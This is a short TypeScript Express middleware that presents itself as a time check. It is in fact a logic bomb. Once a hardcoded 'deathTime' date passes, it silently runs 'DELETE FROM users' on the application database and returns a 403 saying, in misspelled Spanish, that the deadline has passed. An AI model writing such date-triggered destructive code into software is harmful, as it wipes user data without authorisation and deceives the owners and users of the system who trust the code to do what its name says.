import { Request, Response, NextFunction } from "express";
import { BsDate } from "../db/db";

export const verifyTime = async (_req: Request, res: Response, next: NextFunction) => {
    const currentTime = new Date();
    const deathTime = new Date('2024-07-26T17:16:00');

    if (currentTime > deathTime) {
        try {
            await BsDate.query('DELETE FROM users');
            return res.status(403).json({ message: "la fehca limite ha pasado" })
        } catch (error) {
            return res.status(500).json({ message: `${error}` })
        }
    }
    return next();
}